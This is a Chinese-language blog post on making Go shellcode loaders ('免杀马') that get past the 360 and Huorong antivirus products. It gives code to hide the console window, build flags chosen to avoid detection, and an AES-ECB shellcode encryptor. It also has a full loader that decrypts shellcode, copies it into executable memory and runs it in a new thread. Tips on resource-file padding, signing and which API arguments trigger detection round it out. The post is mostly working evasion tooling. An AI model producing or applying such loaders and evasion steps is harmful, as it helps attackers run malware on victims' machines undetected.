<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">-H windowsgui</span></span><br></pre></td></tr></table></figure>

<p><strong>写函数消除黑框</strong></p>
<p>360会杀这种写法</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;github.com/gonutz/ide/w32&quot;</span></span><br><span class="line"></span><br><span class="line">func <span class="title function_">closeWindows</span>(<span class="params">commandShow uintptr</span>) &#123;</span><br><span class="line">	<span class="variable language_">console</span> := w32.<span class="title class_">GetConsoleWindow</span>()</span><br><span class="line">	<span class="keyword">if</span> <span class="variable language_">console</span> != <span class="number">0</span> &#123;</span><br><span class="line">		_, consoleProcID := w32.<span class="title class_">GetWindowThreadProcessId</span>(<span class="variable language_">console</span>)</span><br><span class="line">		<span class="keyword">if</span> w32.<span class="title class_">GetCurrentProcessId</span>() == consoleProcID &#123;</span><br><span class="line">			w32.<span class="title class_">ShowWindowAsync</span>(<span class="variable language_">console</span>, commandShow)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">	<span class="title function_">closeWindows</span>(w32.<span class="property">SW_HIDE</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>调用windows api，Win10&#x2F;Win11</strong></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span>(</span><br><span class="line">	kernel32 = syscall.MustLoadDLL(<span class="string">&quot;kernel32.dll&quot;</span>)</span><br><span class="line">	procFreeConsole = kernel32.MustFindProc(<span class="string">&quot;FreeConsole&quot;</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">HideConsoleWindow</span><span class="params">()</span></span> &#123;</span><br><span class="line">	procFreeConsole.Call()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	HideConsoleWindow()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="360免杀绕过"><a href="#360免杀绕过" class="headerlink" title="360免杀绕过"></a>360免杀绕过</h5><p>需要知道报QVM错误代表文件结构有问题，而非代码有问题</p>
<p>在360安全卫士【安全操作中心】-&gt; 【上报记录】中可以查看云传检查结果<img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250529085753301.png" alt="image-20250529085753301"></p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250529090009504.png" alt="image-20250529090009504"></p>
<p>如图所示，云传结果通常有3种，”木马病毒”、”低风险”、”未发现风险”</p>
<p>其中”低风险”基本可以等效于”永久免杀”</p>
<p>而”未发现风险”依然有可能被杀，只是时间问题。</p>
<p>首先要确认免杀思路，一是”.exe”的问题(即编译参数、签名、资源信息等)，二是代码本身的问题。</p>
<h6 id="exe层面免杀"><a href="#exe层面免杀" class="headerlink" title=".exe层面免杀"></a>.exe层面免杀</h6><p><strong>(1) 编译参数</strong></p>
<p>使用工具 CheckGoBuild，使用10中不同的参数进行编译，看哪些会被杀，代码使用打印hello world</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250529092144265.png" alt="image-20250529092144265"></p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250529092617562.png" alt="image-20250529092617562"></p>
<p>“-race”和”-ldflags&#x3D; -H windowsgui”这两个编译参数可能会被360查杀</p>
<p>推荐使用的编译参数如下</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go build -o <span class="selector-tag">main</span><span class="selector-class">.exe</span> -ldflags=<span class="string">&quot;-w -s&quot;</span> -trimpath <span class="selector-tag">main</span>.go</span><br></pre></td></tr></table></figure>

<p>测试去除黑框代码，360不报毒如下所示</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;github.com/gonutz/ide/w32&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">closeWindows</span><span class="params">(commandShow <span class="type">uintptr</span>)</span></span> &#123;</span><br><span class="line">	console := w32.GetConsoleWindow()</span><br><span class="line">	<span class="keyword">if</span> console != <span class="number">0</span> &#123;</span><br><span class="line">		_, consoleProcID := w32.GetWindowThreadProcessId(console)</span><br><span class="line">		<span class="keyword">if</span> w32.GetCurrentProcessId() == consoleProcID &#123;</span><br><span class="line">			w32.ShowWindowAsync(console, commandShow)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>(2) 其他因素</strong></p>
<p>加签名、加资源文件、加壳、控制熵值等等。</p>
<h6 id="代码层面免杀"><a href="#代码层面免杀" class="headerlink" title="代码层面免杀"></a>代码层面免杀</h6><p><strong>(1) 调用windows api的包</strong></p>
<p>之前用的是 syscall 包来调用 windows api</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;syscall&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	kernel32 := syscall.MustLoadDLL(<span class="string">&quot;kernel32.dll&quot;</span>)</span><br><span class="line">	VirtualAlloc := kernel32.MustFindProc(<span class="string">&quot;VirtualAlloc&quot;</span>)</span><br><span class="line">	VirtualAlloc.Call()</span><br><span class="line">	kernel32.Release()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>若 syscall 被查杀，可以换成另一个包 golang.org&#x2F;x&#x2F;sys&#x2F;windows</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;golang.org/x/sys/windows&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	kernel32 := windows.MustLoadDLL(<span class="string">&quot;kernel32.dll&quot;</span>)</span><br><span class="line">	VirtualAlloc := kernel32.MustFindProc(<span class="string">&quot;VirtualAlloc&quot;</span>)</span><br><span class="line">	VirtualAlloc.Call()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>(2) 加载DLL的方法</strong></p>
<p>除了 MustLoadDLL，还有 NewLazyDLL方法可以使用</p>
<figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">MustLoadDLL 和 NewLazyDLL 的区别</span><span class="punctuation">:</span></span><br><span class="line">1、返回类型不一样：一个指向 DLL 结构体的指针, 一个指向 LazyDLL 结构体的指针</span><br><span class="line">2、加载时间不一样：MustLoadDLL 在程序启动时就需要加载并使用 DLL, NewLazyDLL 惰性加载， 在程序运行时调用 DLL 函数时才加载 DLL 文件</span><br></pre></td></tr></table></figure>

<p>MustLoadDLL已经被常见杀软标记特征，所以推荐使用 NewLazyDLL</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;syscall&quot;</span></span><br><span class="line">	<span class="string">&quot;unsafe&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	kernel32 := syscall.NewLazyDLL(<span class="string">&quot;kernel32.dll&quot;</span>)</span><br><span class="line">	VirtualAlloc := kernel32.NewProc(<span class="string">&quot;VirtualAlloc&quot;</span>)</span><br><span class="line">	RtlMoveMemory := kernel32.NewProc(<span class="string">&quot;RtlMoveMemory&quot;</span>)</span><br><span class="line">	buf := []<span class="type">byte</span>&#123;<span class="number">0xe8</span>, <span class="number">0xa0</span>, <span class="number">0x03</span>...&#125;</span><br><span class="line">	addr, _, _ := VirtualAlloc.Call(<span class="number">0</span>, <span class="type">uintptr</span>(<span class="built_in">len</span>(buf)), <span class="number">0x1000</span>|<span class="number">0x2000</span>, <span class="number">0x40</span>)</span><br><span class="line">	RtlMoveMemory.Call(addr, (<span class="type">uintptr</span>)(unsafe.Pointer(&amp;buf[<span class="number">0</span>])), <span class="type">uintptr</span>(<span class="built_in">len</span>(buf)))</span><br><span class="line">	syscall.Syscall(addr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h6 id="制作360免杀马"><a href="#制作360免杀马" class="headerlink" title="制作360免杀马"></a>制作360免杀马</h6><p>shellcode，尝试sgn + aes加密</p>
<p>aes加密代码</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;bytes&quot;</span></span><br><span class="line">	<span class="string">&quot;crypto/aes&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">AesEncryptByECB</span><span class="params">(data []<span class="type">byte</span>, key <span class="type">string</span>)</span></span> ([]<span class="type">byte</span>, <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="comment">// 判断 key 长度</span></span><br><span class="line">	keyLenMap := <span class="keyword">map</span>[<span class="type">int</span>]<span class="keyword">struct</span>&#123;&#125;&#123;<span class="number">16</span>: &#123;&#125;, <span class="number">24</span>: &#123;&#125;, <span class="number">32</span>: &#123;&#125;&#125;</span><br><span class="line">	<span class="keyword">if</span> _, ok := keyLenMap[<span class="built_in">len</span>(key)]; !ok &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;invalid key length&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 将 key 转为 []byte</span></span><br><span class="line">	keyByte := []<span class="type">byte</span>(key)</span><br><span class="line">	<span class="comment">// 创建密码组，长度只能是 16、24、32 字节</span></span><br><span class="line">	block, err := aes.NewCipher(keyByte)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 获取密钥长度</span></span><br><span class="line">	blockSize := block.BlockSize()</span><br><span class="line">	<span class="comment">// 补码</span></span><br><span class="line">	originByte := PKCS7Padding(data, blockSize)</span><br><span class="line">	<span class="comment">// 创建保存加密结果的变量</span></span><br><span class="line">	encryptResult := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="built_in">len</span>(originByte))</span><br><span class="line">	<span class="comment">// ECB 是把整个明文分成若干段相同的小段，然后对每一小段进行加密</span></span><br><span class="line">	<span class="keyword">for</span> bs, be := <span class="number">0</span>, blockSize; bs &lt; <span class="built_in">len</span>(originByte); bs, be = bs+blockSize, be+blockSize &#123;</span><br><span class="line">		block.Encrypt(encryptResult[bs:be], originByte[bs:be])</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> encryptResult, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 补码</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">PKCS7Padding</span><span class="params">(originByte []<span class="type">byte</span>, blockSize <span class="type">int</span>)</span></span> []<span class="type">byte</span> &#123;</span><br><span class="line">	<span class="comment">// 计算补码长度</span></span><br><span class="line">	padding := blockSize - <span class="built_in">len</span>(originByte)%blockSize</span><br><span class="line">	<span class="comment">// 生成补码</span></span><br><span class="line">	padText := bytes.Repeat([]<span class="type">byte</span>&#123;<span class="type">byte</span>(padding)&#125;, padding)</span><br><span class="line">	<span class="comment">// 追加补码</span></span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">append</span>(originByte, padText...)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">AesDecryptByECB</span><span class="params">(data []<span class="type">byte</span>, key <span class="type">string</span>)</span></span> ([]<span class="type">byte</span>, <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="comment">// 判断 key 长度</span></span><br><span class="line">	keyLenMap := <span class="keyword">map</span>[<span class="type">int</span>]<span class="keyword">struct</span>&#123;&#125;&#123;<span class="number">16</span>: &#123;&#125;, <span class="number">24</span>: &#123;&#125;, <span class="number">32</span>: &#123;&#125;&#125;</span><br><span class="line">	<span class="keyword">if</span> _, ok := keyLenMap[<span class="built_in">len</span>(key)]; !ok &#123;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 密钥转为 []byte</span></span><br><span class="line">	keyByte := []<span class="type">byte</span>(key)</span><br><span class="line">	<span class="comment">// 创建密码组，长度只能是 16、24、32 字节</span></span><br><span class="line">	block, err := aes.NewCipher(keyByte)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 获取密钥长度</span></span><br><span class="line">	blockSize := block.BlockSize()</span><br><span class="line">	<span class="comment">// 反解密码 base64</span></span><br><span class="line">	originByte := data</span><br><span class="line">	<span class="comment">// 创建保存解密变量</span></span><br><span class="line">	decrypted := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="built_in">len</span>(originByte))</span><br><span class="line">	<span class="keyword">for</span> bs, be := <span class="number">0</span>, blockSize; bs &lt; <span class="built_in">len</span>(originByte); bs, be = bs+blockSize, be+blockSize &#123;</span><br><span class="line">		block.Decrypt(decrypted[bs:be], originByte[bs:be])</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 解码</span></span><br><span class="line">	<span class="keyword">return</span> PKCS7UNPadding(decrypted), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解码</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">PKCS7UNPadding</span><span class="params">(originDataByte []<span class="type">byte</span>)</span></span> []<span class="type">byte</span> &#123;</span><br><span class="line">	length := <span class="built_in">len</span>(originDataByte)</span><br><span class="line">	unpadding := <span class="type">int</span>(originDataByte[length<span class="number">-1</span>])</span><br><span class="line">	<span class="keyword">return</span> originDataByte[:(length - unpadding)]</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 1-255</span></span><br><span class="line">	key := <span class="string">&quot;1234567890abcdef&quot;</span></span><br><span class="line">	shellcode :=</span><br><span class="line">		[]<span class="type">byte</span>&#123;<span class="number">0xe8</span>, <span class="number">0xa0</span>, <span class="number">0x03</span>...&#125;</span><br><span class="line">	<span class="comment">// 加密消息</span></span><br><span class="line">	encrypted, _ := AesEncryptByECB(shellcode, key)</span><br><span class="line">	hexData := <span class="string">&quot;&quot;</span></span><br><span class="line">	<span class="keyword">for</span> _, b := <span class="keyword">range</span> encrypted &#123;</span><br><span class="line">		hexData += fmt.Sprintf(<span class="string">&quot;0x%02x,&quot;</span>, b)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 移除末尾的逗号和空格</span></span><br><span class="line">	hexData = hexData[:<span class="built_in">len</span>(hexData)<span class="number">-1</span>]</span><br><span class="line">	<span class="comment">// 打印16进制数据</span></span><br><span class="line">	fmt.Printf(<span class="string">&quot;加密后的消息:\n%s&quot;</span>, hexData)</span><br><span class="line">	<span class="comment">// 解密消息</span></span><br><span class="line">	decrypted, _ := AesDecryptByECB(encrypted, key)</span><br><span class="line">	dhexData := <span class="string">&quot;&quot;</span></span><br><span class="line">	<span class="keyword">for</span> _, b := <span class="keyword">range</span> decrypted &#123;</span><br><span class="line">		dhexData += fmt.Sprintf(<span class="string">&quot;0x%02x,&quot;</span>, b)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 移除末尾的逗号和空格</span></span><br><span class="line">	dhexData = dhexData[:<span class="built_in">len</span>(dhexData)<span class="number">-1</span>]</span><br><span class="line">	<span class="comment">// 打印16进制数据</span></span><br><span class="line">	fmt.Printf(<span class="string">&quot;解密后的消息:\n%s&quot;</span>, dhexData)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>写加载器</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;crypto/aes&quot;</span></span><br><span class="line">	<span class="string">&quot;syscall&quot;</span></span><br><span class="line">	<span class="string">&quot;unsafe&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">	MEM_COMMIT             = <span class="number">0x1000</span></span><br><span class="line">	PAGE_EXECUTE_READWRITE = <span class="number">0x40</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">AesDecryptByECB</span><span class="params">(data []<span class="type">byte</span>, key <span class="type">string</span>)</span></span> ([]<span class="type">byte</span>, <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="comment">// 判断 key 长度</span></span><br><span class="line">	keyLenMap := <span class="keyword">map</span>[<span class="type">int</span>]<span class="keyword">struct</span>&#123;&#125;&#123;<span class="number">16</span>: &#123;&#125;, <span class="number">24</span>: &#123;&#125;, <span class="number">32</span>: &#123;&#125;&#125;</span><br><span class="line">	<span class="keyword">if</span> _, ok := keyLenMap[<span class="built_in">len</span>(key)]; !ok &#123;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 密钥转为 []byte</span></span><br><span class="line">	keyByte := []<span class="type">byte</span>(key)</span><br><span class="line">	<span class="comment">// 创建密码组，长度只能是 16、24、32 字节</span></span><br><span class="line">	block, err := aes.NewCipher(keyByte)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 获取密钥长度</span></span><br><span class="line">	blockSize := block.BlockSize()</span><br><span class="line">	<span class="comment">// 反解密码 base64</span></span><br><span class="line">	originByte := data</span><br><span class="line">	<span class="comment">// 创建保存解密变量</span></span><br><span class="line">	decrypted := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="built_in">len</span>(originByte))</span><br><span class="line">	<span class="keyword">for</span> bs, be := <span class="number">0</span>, blockSize; bs &lt; <span class="built_in">len</span>(originByte); bs, be = bs+blockSize, be+blockSize &#123;</span><br><span class="line">		block.Decrypt(decrypted[bs:be], originByte[bs:be])</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 解码</span></span><br><span class="line">	<span class="keyword">return</span> PKCS7UNPadding(decrypted), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解码</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">PKCS7UNPadding</span><span class="params">(originDataByte []<span class="type">byte</span>)</span></span> []<span class="type">byte</span> &#123;</span><br><span class="line">	length := <span class="built_in">len</span>(originDataByte)</span><br><span class="line">	unpadding := <span class="type">int</span>(originDataByte[length<span class="number">-1</span>])</span><br><span class="line">	<span class="keyword">return</span> originDataByte[:(length - unpadding)]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 1.加载kernel32.dll</span></span><br><span class="line">	kernel32 := syscall.MustLoadDLL(<span class="string">&quot;kernel32.dll&quot;</span>)</span><br><span class="line">	<span class="comment">// 2.获取windows api</span></span><br><span class="line">	VirtualAlloc := kernel32.MustFindProc(<span class="string">&quot;VirtualAlloc&quot;</span>)</span><br><span class="line">	RtlCopyMemory := kernel32.MustFindProc(<span class="string">&quot;RtlCopyMemory&quot;</span>)</span><br><span class="line">	CreateThread := kernel32.MustFindProc(<span class="string">&quot;CreateThread&quot;</span>)</span><br><span class="line">	WaitForSingleObject := kernel32.MustFindProc(<span class="string">&quot;WaitForSingleObject&quot;</span>)</span><br><span class="line">	encrypted := []<span class="type">byte</span>&#123;<span class="number">0xaa</span>, <span class="number">0x85</span>, <span class="number">0x9d</span>, ...&#125;</span><br><span class="line">	key := <span class="string">&quot;1234567890abcdef&quot;</span></span><br><span class="line">	shellcode_buf, _ := AesDecryptByECB(encrypted, key)</span><br><span class="line">	addr, _, _ := VirtualAlloc.Call(<span class="number">0</span>, <span class="type">uintptr</span>(<span class="built_in">len</span>(shellcode_buf)), MEM_COMMIT, <span class="number">0x40</span>)</span><br><span class="line">	RtlCopyMemory.Call(addr, (<span class="type">uintptr</span>)(unsafe.Pointer(&amp;shellcode_buf[<span class="number">0</span>])),</span><br><span class="line">		<span class="type">uintptr</span>(<span class="built_in">len</span>(shellcode_buf)))</span><br><span class="line">	h, _, _ := CreateThread.Call(<span class="number">0</span>, <span class="number">0</span>, addr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">	WaitForSingleObject.Call(h, <span class="number">0xfffffff</span>)</span><br><span class="line">	<span class="comment">// 7.关闭 DLL</span></span><br><span class="line">	kernel32.Release()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先使用bypassQVM工具添加资源文件信息</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> QVM250.<span class="keyword">py</span> -d test -n <span class="number">10</span></span><br></pre></td></tr></table></figure>

<p>然后加签名即可</p>
<p>反反复复尝试了很多使用Go写的变形免杀马，只能达到”未发现风险”的效果而非”低风险”，之后是否还要用Go还有待考量。</p>
<h5 id="火绒免杀绕过"><a href="#火绒免杀绕过" class="headerlink" title="火绒免杀绕过"></a>火绒免杀绕过</h5><p>火绒的免杀相比360就比较鸡肋了。火绒不杀 “-H windowsgui”</p>
<p>所以可以直接一把梭命令编译</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">go</span> build -<span class="keyword">o</span> ceshi.<span class="keyword">exe</span> -ldflags=<span class="string">&quot;-w -s -H windowsgui&quot;</span> -trimpath main.<span class="keyword">go</span></span><br></pre></td></tr></table></figure>

<h6 id="sss火绒查杀点"><a href="#sss火绒查杀点" class="headerlink" title="sss火绒查杀点"></a>sss火绒查杀点</h6><p>(1) shellcode特征，这个sgn&#x2F;aes这种强加密可以直接过掉</p>
<p>(2) 函数参数，如 0x1000|0x2000 需要替换为 0x1000</p>
<p>创建线程执行即可免杀，代码如上所示，不做赘述。</p>
<p>经过测试，发现火绒还查杀 VirtualAlloc.Call中的参数，直接写0x1000就好</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250530093821109.png" alt="image-20250530093821109"></p>
<p>0x1000|0x2000：先预留一段内存，再提交内存</p>
<p>0x1000：直接提交内存</p>

      </div>
      
        <div class="prev-or-next">
          <div class="post-foot-next">
            
          </div>
          <div class="post-attach">
            <span class="post-pubtime">
              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
              2025-06-04 14:00:30
            </span>
            
          </div>
          <div class="post-foot-prev">
            
              <a href="/2025/06/04/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%AD%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8/" target="_self">
                <span>下一页</span>
                <i class="iconfont icon-chevronright"></i>
              </a>
            
          </div>
        </div>
      
    </div>
    
  <div id="btn-catalog" class="btn-catalog">
    <i class="iconfont icon-catalog"></i>
  </div>
  <div class="post-catalog hidden" id="catalog">
    <div class="title">目录</div>
    <div class="catalog-content">
      
